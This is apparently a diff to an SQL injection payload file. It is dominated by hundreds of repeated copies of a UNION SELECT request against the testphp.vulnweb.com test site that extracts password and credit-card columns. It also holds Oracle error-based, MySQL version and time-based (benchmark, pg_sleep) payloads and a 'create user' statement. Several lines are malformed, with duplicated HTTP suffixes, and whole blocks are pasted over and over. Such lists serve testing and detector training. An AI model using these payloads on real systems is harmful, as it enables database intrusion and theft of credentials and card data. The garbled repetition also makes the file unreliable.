@@ -1,13 +1,1070 @@
 GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
-GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
 or pg_sleep ( __TIME__ ) --
 create user name identified by pass123 temporary tablespace temp default tablespace users; 
-%29
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
 ' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
 select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
 select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
 GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
-,1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
